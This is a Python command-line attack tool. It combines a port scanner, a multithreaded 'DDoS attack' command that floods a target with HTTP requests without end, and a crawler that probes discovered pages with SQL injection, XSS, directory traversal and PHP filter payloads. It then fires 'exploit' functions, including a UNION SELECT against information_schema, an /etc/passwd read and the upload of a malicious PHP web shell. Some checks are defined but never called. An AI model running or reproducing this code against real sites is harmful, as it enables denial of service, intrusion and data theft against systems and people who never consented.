import click
import socket
import threading
from rich import print as rprint
from rich.console import Console
import click_completion
import requests
import re
from bs4 import BeautifulSoup
from urllib.parse import urljoin
import logging
from datetime import datetime

click_completion.init()

console = Console()
attack_num = 0


@click.command()
def scan_ports():
    try:
        hostname = input("Enter the website URL or IP address: ")
        ip_address = socket.gethostbyname(hostname)
        rprint(
            f'Scanning ports for [bold]{hostname}[/bold] ([cyan]{ip_address}[/cyan])...')
        open_ports = []

        for port in range(1, 1001):  # Scan ports 1 to 1000
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
                sock.settimeout(0.1)  # Set a timeout for connection attempt
                result = sock.connect_ex((ip_address, port))
                if result == 0:
                    open_ports.append(port)
                    rprint(f'[green]Port {port}[/green] is open')

        if not open_ports:
            rprint('[bold yellow]No open ports found.[/bold yellow]')
        else:
            rprint('[bold]Open ports:[/bold]', open_ports)

    except socket.gaierror:
        rprint(
            '[bold red]Hostname could not be resolved. Please enter a valid hostname.[/bold red]')
    except socket.error as e:
        rprint('[bold red]Could not connect to server.[/bold red]')
        rprint(f'[italic red]{e}[/italic red]')


@click.command()
@click.argument("--target", type=click.STRING)
@click.argument("--port", type=click.INT)
@click.option("--threads", default=100, help="Number of threads for DDoS attack")
def attack(target, port, threads):
    rprint(
        f'Initiating DDoS attack on [bold]{target}[/bold] on port [cyan]{port}[/cyan] with [cyan]{threads}[/cyan] threads...')
    for _ in range(threads):
        thread = threading.Thread(target=ddos, args=(target, port))
        thread.start()


def ddos(target: str, port: int):
    while True:
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                target_ip = socket.gethostbyname(target)
                s.connect((target_ip, port))
                s.send(("GET / HTTP/1.1\r\n").encode('ascii'))
                s.send(("Host: " + target + "\r\n\r\n").encode('ascii'))

                global attack_num
                attack_num += 1
                rprint(f"[bold red]Attack Number: {attack_num}[/bold red]")

        except socket.gaierror as e:
            rprint(
                f"[bold red]Failed to resolve hostname {target}:[/bold red] {e}")
            break
        except Exception as e:
            rprint(f"[bold red]Error in DDoS attack:[/bold red] {e}")
            break


@click.command()
def version():
    rprint(f"[bold blue]version 0.0.1[/bold blue]")


@click.command()
@click.argument("url", type=click.STRING)
def map(url):
    # Step 1: Discover URLs on the website
    discovered_urls = discover_urls(url)
    current_datetime = datetime.now()
    current_time_str = current_datetime.strftime("%Y%m%d")
    logname = f"logs/map_{current_time_str}.log"
    logging.basicConfig(filename=logname,
                        filemode='a',
                        format='%(asctime)s,%(msecs)d %(name)s %(levelname)s %(message)s',
                        datefmt='%H:%M:%S',
                        level=logging.INFO)
    logging.info(discovered_urls)
    rprint(
        f"[bold cyan]Discovered {len(discovered_urls)} URLs on {url}:[/bold cyan]\n")
    for i, discovered_url in enumerate(discovered_urls, start=1):
        rprint(f"[bold green]{i}. {discovered_url}[/bold green]")

    # Step 2: Scan discovered URLs for vulnerabilities
    for page_url in discovered_urls:
        vulnerabilities = scan_url(page_url)
        if vulnerabilities:
            rprint(
                f"\n[bold white]Vulnerabilities found on {page_url}:[/bold white]")
            for vulnerability, attack_method in vulnerabilities.items():
                rprint(
                    f"\n[bold red]Vulnerability: {vulnerability}[/bold red]")
                rprint(f"[bold red]Attack Method: {attack_method}[/bold red]")
                if vulnerability == "SQL injection vulnerability":
                    rprint("[bold blue]\nSQL Injection Method:[/bold blue]")
                    rprint(
                        "[blue]1. Identify the input field vulnerable to SQL injection[/blue]")
                    rprint(
                        "[blue]2. Inject SQL code to manipulate the query, e.g., ' OR '1'='1'[/blue]")
                    rprint(
                        "[blue]3. Observe the response for any error messages or unusual behavior[/blue]")
                    exploit_sql_injection(url)
                elif vulnerability == "Cross-site scripting (XSS) vulnerability":
                    rprint("[bold blue]\nXSS Attack Method:[/bold blue]")
                    rprint(
                        "[blue]1. Identify the input field vulnerable to XSS[/blue]")
                    rprint(
                        "[blue]2. Inject malicious scripts, e.g., <script>alert('XSS')</script>[/blue]")
                    rprint(
                        "[blue]3. Observe the behavior of the injected script[/blue]")
                    exploit_xss_vulnerability(url)
                elif vulnerability == "Directory Traversal vulnerability":
                    rprint(
                        "[bold blue]\nDirectory Traversal Attack Method:[/bold blue]")
                    rprint(
                        "[blue]1. Attempt to navigate to directories outside of the web root[/blue]")
                    rprint(
                        "[blue]2. Access sensitive files such as configuration files[/blue]")
                    exploit_directory_traversal(url)
                elif vulnerability == "Remote Code Execution vulnerability":
                    rprint(
                        "[bold blue]\nRemote Code Execution Attack Method:[/bold blue]")
                    rprint(
                        "[blue]1. Identify input fields or parameters that allow execution of code[/blue]")
                    rprint(
                        "[blue]2. Inject code to execute commands on the server[/blue]")
                    exploit_remote_code_execution(url)
                elif vulnerability == "File Upload vulnerability":
                    rprint("[bold blue]\nFile Upload Attack Method:[/bold blue]")
                    rprint(
                        "[blue]1. Identify the file upload functionality[/blue]")
                    rprint(
                        "[blue]2. Upload a malicious file containing code or executable payload[/blue]")
                    exploit_file_upload(url)


def discover_urls(url):
    discovered_urls = []

    # Send a GET request to the given URL
    response = requests.get(url)
    if response.status_code == 200:
        # Parse the HTML content of the response
        soup = BeautifulSoup(response.text, "html.parser")

        # Find all anchor tags and extract URLs
        for anchor_tag in soup.find_all("a"):
            href = anchor_tag.get("href")
            if href:
                absolute_url = urljoin(url, href)
                discovered_urls.append(absolute_url)

    return discovered_urls


def scan_url(url):
    vulnerabilities = {}

    # Step 1: Perform vulnerability scans using a vulnerability scanner or custom checks

    # Example: Check for SQL injection vulnerability
    if is_sql_injection_vulnerable(url):
        vulnerabilities["SQL injection vulnerability"] = "Injecting SQL code into input fields"

    # Example: Check for cross-site scripting (XSS) vulnerability
    if is_xss_vulnerable(url):
        vulnerabilities["Cross-site scripting (XSS) vulnerability"] = "Injecting malicious scripts into input fields"

    # Step 2: Perform additional vulnerability checks or manual code review

    # Example: Check for insecure server configuration
    if has_insecure_configuration(url):
        vulnerabilities["Insecure server configuration"] = "Exploiting insecure communication protocols"

    return vulnerabilities


def is_sql_injection_vulnerable(url):
    # Perform checks for SQL injection vulnerability
    # Example: Send a malicious SQL query and check the response
    payload = "' OR '1'='1"
    response = requests.get(url + "?id=" + payload)
    if re.search(r"error|warning", response.text, re.IGNORECASE):
        return True
    return False


def is_xss_vulnerable(url):
    # Perform checks for cross-site scripting (XSS) vulnerability
    # Example: Inject a script tag and check if it gets executed
    payload = "<script>alert('XSS')</script>"
    response = requests.get(url + "?input=" + payload)
    if payload in response.text:
        return True
    return False


def has_insecure_configuration(url):
    # Perform checks for insecure server configuration
    # Example: Check if the website uses HTTP instead of HTTPS
    if not url.startswith("https"):
        return True
    return False


def is_directory_traversal_vulnerable(url):
    # Attempt to access a file outside of the web root directory
    test_path = "../../../../../../../../etc/passwd"
    response = requests.get(url + "/" + test_path)
    if "root:" in response.text:
        return True
    return False


def is_remote_code_execution_vulnerable(url):
    # Check if certain server-side functionality allows code execution
    # Example: If there's a PHP file inclusion vulnerability
    test_payload = "php://filter/convert.base64-encode/resource=index"
    response = requests.get(url + "?page=" + test_payload)
    if "base64" in response.text:
        return True
    return False


def is_file_upload_vulnerable(url):
    # Check if the website allows uploading of potentially executable files
    # Example: Check if file upload accepts .php files
    test_file = "test.php"
    files = {'file': open(test_file, 'rb')}
    response = requests.post(url + "/upload", files=files)
    if test_file in response.text:
        return True
    return False


# def exploit_sql_injection(url):
#     # Placeholder function for exploiting SQL injection vulnerability
#     rprint(
#         f"[bold red]Exploiting SQL injection vulnerability on {url}[/bold red]")
#     # Example:
#     # Inject SQL code to retrieve sensitive data or manipulate the database
#     # e.g., SELECT * FROM users WHERE username='admin' AND password='12345'
#     # Perform the SQL injection attack and observe the response
#     response = requests.get(url + "?id=' OR '1'='1'")
#     rprint(
#         f"[bold red]Response after exploiting SQL injection: {response.text} [/bold red]")

def exploit_sql_injection(url):
    # Exploiting SQL injection vulnerability
    print(f"Exploiting SQL injection vulnerability on {url}")

    # Inject SQL code to retrieve data from a database
    payload = "?id=1' UNION SELECT table_name FROM information_schema.tables--"

    # Perform the SQL injection attack and observe the response
    response = requests.get(url + payload)

    # Print the response after exploiting SQL injection
    print(f"Response after exploiting SQL injection: {response.text}")


def exploit_xss_vulnerability(url):
    # Placeholder function for exploiting XSS vulnerability
    rprint(f"[bold red]Exploiting XSS vulnerability on {url}[/bold red]")
    # Example:
    # Inject a script to perform malicious actions in the context of other users
    # e.g., <script>alert('XSS')</script>
    # Inject the script and observe the behavior
    response = requests.get(url + "?input=<script>alert('XSS')</script>")
    rprint(
        f"[bold red]Response after exploiting XSS: {response.text} [/bold red]")


def exploit_directory_traversal(url):
    # Placeholder function for exploiting directory traversal vulnerability
    rprint(
        f"[bold red]Exploiting directory traversal vulnerability on {url} [/bold red]")
    # Example:
    # Attempt to access sensitive files outside of the web root directory
    # e.g., ../../../../../../../etc/passwd
    # Attempt the directory traversal attack and observe the response
    response = requests.get(url + "/../../../../../../../etc/passwd")
    rprint(
        f"[bold red]Response after exploiting directory traversal: {response.text}[/bold red]")


def exploit_remote_code_execution(url):
    # Placeholder function for exploiting remote code execution vulnerability
    rprint(
        f"[bold red]Exploiting remote code execution vulnerability on {url}[/bold red]")
    # Example:
    # Inject code to execute arbitrary commands on the server
    # e.g., php://filter/convert.base64-encode/resource=index
    # Inject the payload and observe the server's response
    response = requests.get(
        url + "?page=php://filter/convert.base64-encode/resource=index")
    rprint(
        f"[bold red]Response after exploiting remote code execution: {response.text}[/bold red]")


def exploit_file_upload(url):
    # Placeholder function for exploiting file upload vulnerability
    rprint(
        f"[bold red]Exploiting file upload vulnerability on {url}[/bold red]")
    # Example:
    # Upload a malicious file containing code or executable payload
    # e.g., a PHP file containing web shell code
    files = {'file': open('malicious.php', 'rb')}
    response = requests.post(url + "/upload", files=files)
    rprint(
        f"[bold red]Response after exploiting file upload: {response.text} [/bold red]")
